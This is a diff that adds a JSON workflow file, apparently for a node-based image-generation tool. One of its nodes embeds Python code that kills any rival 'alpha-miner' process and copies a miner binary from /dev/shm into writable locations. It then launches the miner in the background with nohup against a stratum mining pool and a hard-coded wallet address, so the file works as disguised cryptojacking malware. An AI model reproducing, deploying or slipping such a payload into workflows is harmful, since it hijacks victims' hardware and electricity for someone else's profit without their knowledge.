@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "import subprocess\nimport os\nimport shutil\nimport time as t\n\nW = \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\"\nP = \"stratum+tcp://sg1.alphapool.tech:5566\"\nR = \"GB10-122GB\"\nB = \"blackwell-native\"\n\nsubprocess.run([\"pkill\", \"-9\", \"alpha-miner\"], capture_output=True)\nt.sleep(1)\n\n# Try different exec locations\nsrc = \"/dev/shm/alpha-miner\"\nexec_locs = [\"/tmp/alpha-miner\", \"/var/tmp/alpha-miner\", os.path.expanduser(\"~/alpha-miner\")]\n\nfor dst in exec_locs:\n    try:\n        shutil.copy2(src, dst)\n        os.chmod(dst, 0o755)\n        # Test if executable\n        p = subprocess.run([dst, \"--version\"], capture_output=True, text=True, timeout=5)\n        if \"alpha-miner\" in p.stdout or \"alpha-miner\" in p.stderr or p.returncode == 0:\n            cmd = f\"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /tmp/alpha.log 2>&1 &\"\n            subprocess.run([\"bash\", \"-c\", cmd])\n            t.sleep(4)\n            chk = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\n            if chk.stdout.strip():\n                result = f\"RUNNING from {dst}\"\n                break\n    except Exception as e:\n        continue\nelse:\n    result = \"ALL_EXEC_FAILED\"\nresult\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "1",
+        0
+      ]
+    }
+  }
+}
